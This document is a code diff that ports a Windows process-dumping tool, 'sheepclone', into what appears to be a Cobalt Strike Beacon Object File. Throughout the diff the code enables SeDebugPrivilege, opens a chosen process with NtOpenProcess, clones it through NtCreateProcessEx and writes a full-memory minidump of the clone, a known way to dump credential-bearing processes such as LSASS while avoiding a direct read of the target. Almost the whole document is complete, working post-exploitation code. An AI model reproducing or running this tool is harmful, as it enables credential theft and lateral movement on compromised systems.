@@ -1,28 +1,30 @@
 /*
 * Compile with:
-* cl.exe /c /GS- main.c /Fosheepclone.x64.o
+* cl.exe /c /GS- sheepclone.c /Fosheepclone.x64.o
 */
 
 #include <Windows.h>
 #include <TlHelp32.h>
-#include <stdio.h>
 #include "beacon.h"
- 
-// Imported WIN32 API
-DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId();
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI  ADVAPI32$OpenProcessToken();
-DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess();
-DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError();
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$GetTokenInformation();
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle();
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeNameW();
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueW();
-DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges();
-DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress();
-DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW();
-DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW();
-DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$CreateToolhelp32Snapshot();
 
+// Imported WIN32 API
+DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(void);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$GetCurrentProcess(void);
+DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetLastError(void);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$CloseHandle(HANDLE);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeNameW(LPCWSTR, PLUID, LPWSTR, LPDWORD);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$LookupPrivilegeValueW(LPCWSTR, LPCWSTR, PLUID);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI ADVAPI32$AdjustTokenPrivileges(HANDLE, BOOL, PTOKEN_PRIVILEGES, DWORD, PTOKEN_PRIVILEGES, PDWORD);
+DECLSPEC_IMPORT WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);
+DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$GetModuleHandleW(LPCWSTR);
+DECLSPEC_IMPORT WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryW(LPCWSTR);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateToolhelp32Snapshot(DWORD, DWORD);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32First(HANDLE, LPPROCESSENTRY32);
+DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI KERNEL32$Process32Next(HANDLE, LPPROCESSENTRY32);
+DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$CreateFileA(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
+DECLSPEC_IMPORT WINBASEAPI DWORD WINAPI KERNEL32$GetProcessId(HANDLE);
 
 // Define STATUS_SUCCESS if not already defined
 #ifndef STATUS_SUCCESS
@@ -128,55 +130,42 @@ typedef BOOL(WINAPI* PMiniDumpWriteDump)(
 
 static PMiniDumpWriteDump pMiniDumpWriteDump = NULL;
 
-
 // Check if a privilege is already enabled
-BOOL IsPrivilegeEnabled(LPCWSTR privilegeName)
-{
+BOOL IsPrivilegeEnabled(LPCWSTR privilegeName) {
     HANDLE tokenHandle = NULL;
     DWORD bufferSize = 0;
     PTOKEN_PRIVILEGES privileges = NULL;
     BOOL found = FALSE;
 
-    // Open process token
-    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tokenHandle))
-    {
-        printf("\t[!] OpenProcessToken failed in IsPrivilegeEnabled! Error: %lu\n", KERNEL32$GetLastError());
+    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_QUERY, &tokenHandle)) {
+        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken failed in IsPrivilegeEnabled! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
 
-    // Get required buffer size
     ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, NULL, 0, &bufferSize);
-    privileges = (PTOKEN_PRIVILEGES)malloc(bufferSize);
-    if (!privileges)
-    {
-        printf("\t[!] Memory allocation failed\n");
+    privileges = (PTOKEN_PRIVILEGES)MSVCRT$malloc(bufferSize);
+    if (!privileges) {
+        BeaconPrintf(CALLBACK_ERROR, "Memory allocation failed");
         KERNEL32$CloseHandle(tokenHandle);
         return FALSE;
     }
 
-    // Get privilege information
-    if (!ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, privileges, bufferSize, &bufferSize))
-    {
-        printf("\t[!] GetTokenInformation failed! Error: %lu\n", KERNEL32$GetLastError());
-        free(privileges);
+    if (!ADVAPI32$GetTokenInformation(tokenHandle, TokenPrivileges, privileges, bufferSize, &bufferSize)) {
+        BeaconPrintf(CALLBACK_ERROR, "GetTokenInformation failed! Error: %lu", KERNEL32$GetLastError());
+        MSVCRT$free(privileges);
         KERNEL32$CloseHandle(tokenHandle);
         return FALSE;
     }
 
-    // Check for the privilege
-    for (DWORD i = 0; i < privileges->PrivilegeCount; i++)
-    {
+    for (DWORD i = 0; i < privileges->PrivilegeCount; i++) {
         WCHAR name[256];
         DWORD nameSize = sizeof(name) / sizeof(WCHAR);
-        if (ADVAPI32$LookupPrivilegeNameW(NULL, &privileges->Privileges[i].Luid, name, &nameSize))
-        {
-            if (_wcsicmp(name, privilegeName) == 0)
-            {
+        if (ADVAPI32$LookupPrivilegeNameW(NULL, &privileges->Privileges[i].Luid, name, &nameSize)) {
+            if (_wcsicmp(name, privilegeName) == 0) {
                 found = TRUE;
-                if (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED)
-                {
-                    wprintf(L"\t[i] Privilege '%s' is already enabled (Attributes: 0x%lx)\n", privilegeName, privileges->Privileges[i].Attributes);
-                    free(privileges);
+                if (privileges->Privileges[i].Attributes & SE_PRIVILEGE_ENABLED) {
+                    BeaconPrintf(CALLBACK_OUTPUT, "Privilege '%S' is already enabled (Attributes: 0x%lx)", privilegeName, privileges->Privileges[i].Attributes);
+                    MSVCRT$free(privileges);
                     KERNEL32$CloseHandle(tokenHandle);
                     return TRUE;
                 }
@@ -185,71 +174,58 @@ BOOL IsPrivilegeEnabled(LPCWSTR privilegeName)
         }
     }
 
-    free(privileges);
+    MSVCRT$free(privileges);
     KERNEL32$CloseHandle(tokenHandle);
-    if (!found)
-    {
-        wprintf(L"\t[!] Privilege '%s' not found in process token\n", privilegeName);
+    if (!found) {
+        BeaconPrintf(CALLBACK_ERROR, "Privilege '%S' not found in process token", privilegeName);
         return FALSE;
     }
     return FALSE;
 }
 
 // Enable Token Privileges
-BOOL EnablePrivilege()
-{
+BOOL EnablePrivilege() {
     LPCWSTR privilegeName = L"SeDebugPrivilege";
     HANDLE tokenHandle;
     TOKEN_PRIVILEGES tp;
     LUID luid;
 
-    // Check if privilege is already enabled
-    if (IsPrivilegeEnabled(privilegeName))
-    {
-        wprintf(L"\t[i] No need to enable '%s'; it is already enabled\n", privilegeName);
+    if (IsPrivilegeEnabled(privilegeName)) {
+        BeaconPrintf(CALLBACK_OUTPUT, "No need to enable '%S'; it is already enabled", privilegeName);
         return TRUE;
     }
 
-    // Open process token
-    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
-    {
-        printf("\t[!] OpenProcessToken Failed! Error: %lu\n", KERNEL32$GetLastError());
+    if (!ADVAPI32$OpenProcessToken(KERNEL32$GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle)) {
+        BeaconPrintf(CALLBACK_ERROR, "OpenProcessToken Failed! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
-    printf("\t[i] Got Token handle: %p\n", tokenHandle);
+    BeaconPrintf(CALLBACK_OUTPUT, "Got Token handle: %p", tokenHandle);
 
-    // Lookup privilege value
-    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privilegeName, &luid))
-    {
-        wprintf(L"\t[!] LookupPrivilegeValueW Failed for '%s'! Error: %lu\n", privilegeName, KERNEL32$GetLastError());
+    if (!ADVAPI32$LookupPrivilegeValueW(NULL, privilegeName, &luid)) {
+        BeaconPrintf(CALLBACK_ERROR, "LookupPrivilegeValueW Failed for '%S'! Error: %lu", privilegeName, KERNEL32$GetLastError());
         KERNEL32$CloseHandle(tokenHandle);
         return FALSE;
     }
 
-    // Set up privilege structure
     tp.PrivilegeCount = 1;
     tp.Privileges[0].Luid = luid;
     tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
 
-    printf("\t[i] Adjusting token privileges...\n");
-    // Adjust token privileges
-    if (!ADVAPI32$AdjustTokenPrivileges(tokenHandle, FALSE, &tp, 0, NULL, NULL))
-    {
-        printf("\t[!] AdjustTokenPrivileges Failed! Error: %lu\n", KERNEL32$GetLastError());
+    BeaconPrintf(CALLBACK_OUTPUT, "Adjusting token privileges...");
+    if (!ADVAPI32$AdjustTokenPrivileges(tokenHandle, FALSE, &tp, 0, NULL, NULL)) {
+        BeaconPrintf(CALLBACK_ERROR, "AdjustTokenPrivileges Failed! Error: %lu", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(tokenHandle);
         return FALSE;
     }
 
-    // Check for not all assigned error
-    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED)
-    {
-        printf("\t[!] Privilege not held by process token! Error: %lu\n", KERNEL32$GetLastError());
+    if (KERNEL32$GetLastError() == ERROR_NOT_ALL_ASSIGNED) {
+        BeaconPrintf(CALLBACK_ERROR, "Privilege not held by process token! Error: %lu", KERNEL32$GetLastError());
         KERNEL32$CloseHandle(tokenHandle);
         return FALSE;
     }
 
     KERNEL32$CloseHandle(tokenHandle);
-    wprintf(L"\t[i] Successfully enabled '%s'\n", privilegeName);
+    BeaconPrintf(CALLBACK_OUTPUT, "Successfully enabled '%S'", privilegeName);
     return TRUE;
 }
 
@@ -257,16 +233,16 @@ BOOL EnablePrivilege()
 BOOL LoadNtOpenProcess() {
     HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
     if (hNtdll == NULL) {
-        printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to ntdll.dll! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
 
     pNtOpenProcess = (PNtOpenProcess)KERNEL32$GetProcAddress(hNtdll, "NtOpenProcess");
     if (pNtOpenProcess == NULL) {
-        printf("\t[!] Failed to get address of NtOpenProcess! Error: %lu\n", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Failed to get address of NtOpenProcess! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
-    printf("\t[i] Successfully loaded NtOpenProcess from ntdll.dll\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "Successfully loaded NtOpenProcess from ntdll.dll");
     return TRUE;
 }
 
@@ -274,16 +250,16 @@ BOOL LoadNtOpenProcess() {
 BOOL LoadNtCreateProcessEx() {
     HMODULE hNtdll = KERNEL32$GetModuleHandleW(L"ntdll.dll");
     if (hNtdll == NULL) {
-        printf("\t[!] Failed to get handle to ntdll.dll! Error: %lu\n", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Failed to get handle to ntdll.dll! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
 
     pNtCreateProcessEx = (PNtCreateProcessEx)KERNEL32$GetProcAddress(hNtdll, "NtCreateProcessEx");
     if (pNtCreateProcessEx == NULL) {
-        printf("\t[!] Failed to get address of NtCreateProcessEx! Error: %lu\n", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Failed to get address of NtCreateProcessEx! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
-    printf("\t[i] Successfully loaded NtCreateProcessEx from ntdll.dll\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "Successfully loaded NtCreateProcessEx from ntdll.dll");
     return TRUE;
 }
 
@@ -291,16 +267,16 @@ BOOL LoadNtCreateProcessEx() {
 BOOL LoadMiniDumpWriteDump() {
     HMODULE hDbgHelp = KERNEL32$LoadLibraryW(L"Dbghelp.dll");
     if (hDbgHelp == NULL) {
-        printf("\t[!] Failed to load Dbghelp.dll! Error: %lu\n", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Failed to load Dbghelp.dll! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
 
     pMiniDumpWriteDump = (PMiniDumpWriteDump)KERNEL32$GetProcAddress(hDbgHelp, "MiniDumpWriteDump");
     if (pMiniDumpWriteDump == NULL) {
-        printf("\t[!] Failed to get address of MiniDumpWriteDump! Error: %lu\n", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Failed to get address of MiniDumpWriteDump! Error: %lu", KERNEL32$GetLastError());
         return FALSE;
     }
-    printf("\t[i] Successfully loaded MiniDumpWriteDump from Dbghelp.dll\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "Successfully loaded MiniDumpWriteDump from Dbghelp.dll");
     return TRUE;
 }
 
@@ -308,26 +284,25 @@ BOOL LoadMiniDumpWriteDump() {
 DWORD FindProcess(DWORD pid) {
     HANDLE snapshot = KERNEL32$CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
     if (snapshot == INVALID_HANDLE_VALUE) {
-        printf("\t [!] Failed to create snapshot! Error Code: %u\n", KERNEL32$GetLastError());
+        BeaconPrintf(CALLBACK_ERROR, "Failed to create snapshot! Error Code: %u", KERNEL32$GetLastError());
         return 0;
     }
 
     PROCESSENTRY32 pe32 = { sizeof(pe32) };
     DWORD foundPid = 0;
 
-    if (Process32First(snapshot, &pe32)) {
+    if (KERNEL32$Process32First(snapshot, &pe32)) {
         do {
             if (pe32.th32ProcessID == pid) {
                 foundPid = pid;
                 break;
             }
-        } while (Process32Next(snapshot, &pe32));
+        } while (KERNEL32$Process32Next(snapshot, &pe32));
     }
 
     KERNEL32$CloseHandle(snapshot);
     return foundPid;
 }
-
 
 // Function to open a handle to the target process
 NTSTATUS OpenProcessByPID(DWORD pid, PHANDLE hProcess) {
@@ -335,7 +310,6 @@ NTSTATUS OpenProcessByPID(DWORD pid, PHANDLE hProcess) {
     CLIENT_ID parentProcessClientId;
     NTSTATUS ntStatus;
 
-    // Initialize OBJECT_ATTRIBUTES manually
     parentProcessObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
     parentProcessObjectAttributes.RootDirectory = NULL;
     parentProcessObjectAttributes.ObjectName = NULL;
@@ -343,11 +317,9 @@ NTSTATUS OpenProcessByPID(DWORD pid, PHANDLE hProcess) {
     parentProcessObjectAttributes.SecurityDescriptor = NULL;
     parentProcessObjectAttributes.SecurityQualityOfService = NULL;
 
-    // Initialize CLIENT_ID
     parentProcessClientId.UniqueProcess = (HANDLE)(ULONG_PTR)pid;
     parentProcessClientId.UniqueThread = NULL;
 
-    // Open handle to target process
     ntStatus = pNtOpenProcess(
         hProcess,
         PROCESS_CREATE_PROCESS,
@@ -358,10 +330,8 @@ NTSTATUS OpenProcessByPID(DWORD pid, PHANDLE hProcess) {
     return ntStatus;
 }
 
-
-// Clone a process using NtCreateProcessEx, inheriting the parent's address space
-NTSTATUS CloneProcess(HANDLE hParentProcess, PHANDLE hCloneProcess)
-{
+// Clone a process using NtCreateProcessEx
+NTSTATUS CloneProcess(HANDLE hParentProcess, PHANDLE hCloneProcess) {
     OBJECT_ATTRIBUTES cloneObjectAttributes;
 
     cloneObjectAttributes.Length = sizeof(OBJECT_ATTRIBUTES);
@@ -376,30 +346,135 @@ NTSTATUS CloneProcess(HANDLE hParentProcess, PHANDLE hCloneProcess)
         PROCESS_ALL_ACCESS,
         &cloneObjectAttributes,
         hParentProcess,
-        0,          // Flags
-        NULL,       // SectionHandle (inherit image/VA space)
-        NULL,       // DebugPort
-        NULL,       // TokenHandle
-        0           // JobMemberLevel (Reserved)
+        0,
+        NULL,
+        NULL,
+        NULL,
+        0
     );
 }
 
+void go(char* args, int length) {
+    datap parser;
+    DWORD processToClonePid = 0;
+    char* dumpPath = NULL;
+    HANDLE hParentProcess = NULL;
+    HANDLE hCloneProcess = NULL;
+    HANDLE hDumpFile = INVALID_HANDLE_VALUE;
+    NTSTATUS ntStatus;
 
-void go(char * args, int length) {
-	datap parser; 
-	char* str_arg;
-	int num_arg;
+    // Parse arguments
+    BeaconDataParse(&parser, args, length);
+    processToClonePid = BeaconDataInt(&parser);
+    dumpPath = BeaconDataExtract(&parser, NULL);
 
-	// Beacon API for data parser
-	BeaconDataParse(&parser, args, length);
-	str_arg = BeaconDataExtract(&parser, NULL);
-	num_arg = BeaconDataInt(&parser);
+    // Validate arguments
+    if (!processToClonePid || !dumpPath) {
+        BeaconPrintf(CALLBACK_ERROR, "Usage: sheepclone <PID> <PATH_TO_DUMP>");
+        return;
+    }
 
-	DWORD pid = KERNEL32$GetCurrentProcessId();
+    // Validate PID
+    if (processToClonePid <= 0) {
+        BeaconPrintf(CALLBACK_ERROR, "PID must be a positive number!");
+        return;
+    }
 
-	// print out the PID
-	BeaconPrintf(CALLBACK_OUTPUT, "Current Process at %d (PID)", pid);
+    // Find Process
+    if (FindProcess(processToClonePid) == 0) {
+        BeaconPrintf(CALLBACK_ERROR, "Target Process with PID %u Not Found!", processToClonePid);
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Process with PID %u found!", processToClonePid);
 
-	// Print out message with CNA file
-	BeaconPrintf(CALLBACK_OUTPUT, "Message is: %s written with %d arg", str_arg, num_arg);
+    // Load required functions
+    BeaconPrintf(CALLBACK_OUTPUT, "Loading NtOpenProcess function...");
+    if (!LoadNtOpenProcess()) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to load NtOpenProcess function!");
+        return;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "Loading NtCreateProcessEx function...");
+    if (!LoadNtCreateProcessEx()) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to load NtCreateProcessEx function!");
+        return;
+    }
+
+    BeaconPrintf(CALLBACK_OUTPUT, "Loading MiniDumpWriteDump...");
+    if (!LoadMiniDumpWriteDump()) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to load MiniDumpWriteDump!");
+        return;
+    }
+
+    // Enable SeDebugPrivilege
+    BeaconPrintf(CALLBACK_OUTPUT, "Checking token privileges...");
+    if (!EnablePrivilege()) {
+        BeaconPrintf(CALLBACK_ERROR, "EnablePrivilege Failed!!!");
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Privilege operation completed");
+
+    // Open target process
+    ntStatus = OpenProcessByPID(processToClonePid, &hParentProcess);
+    if (hParentProcess == NULL || ntStatus != STATUS_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to open target process! NTSTATUS: 0x%08X", ntStatus);
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Target process opened; handle: 0x%p", hParentProcess);
+
+    // Clone the target process
+    ntStatus = CloneProcess(hParentProcess, &hCloneProcess);
+    if (hCloneProcess == NULL || ntStatus != STATUS_SUCCESS) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to clone target process! NTSTATUS: 0x%08X", ntStatus);
+        KERNEL32$CloseHandle(hParentProcess);
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Clone process created; handle: 0x%p", hCloneProcess);
+
+    // Open dump file
+    hDumpFile = KERNEL32$CreateFileA(
+        dumpPath,
+        GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    if (hDumpFile == INVALID_HANDLE_VALUE) {
+        BeaconPrintf(CALLBACK_ERROR, "Failed to create dump file at '%s'! Error: %lu", dumpPath, KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hCloneProcess);
+        KERNEL32$CloseHandle(hParentProcess);
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Dump file opened. Writing minidump...");
+
+    // Compose dump type
+    MINIDUMP_TYPE dumpType =
+        (MINIDUMP_TYPE)(
+            MiniDumpWithFullMemory |
+            MiniDumpWithHandleData |
+            MiniDumpWithUnloadedModules |
+            MiniDumpWithFullMemoryInfo |
+            MiniDumpWithThreadInfo |
+            MiniDumpWithTokenInformation |
+            MiniDumpWithProcessThreadData |
+            MiniDumpWithModuleHeaders |
+            MiniDumpIgnoreInaccessibleMemory
+            );
+
+    // Write the minidump
+    if (!pMiniDumpWriteDump(hCloneProcess, KERNEL32$GetProcessId(hCloneProcess), hDumpFile, dumpType, NULL, NULL, NULL)) {
+        BeaconPrintf(CALLBACK_ERROR, "MiniDumpWriteDump failed! Error: %lu", KERNEL32$GetLastError());
+        KERNEL32$CloseHandle(hDumpFile);
+        KERNEL32$CloseHandle(hCloneProcess);
+        KERNEL32$CloseHandle(hParentProcess);
+        return;
+    }
+    BeaconPrintf(CALLBACK_OUTPUT, "Minidump successfully written to '%s'", dumpPath);
+
+    // Cleanup
+    KERNEL32$CloseHandle(hDumpFile);
+    KERNEL32$CloseHandle(hCloneProcess);
+    KERNEL32$CloseHandle(hParentProcess);
 }
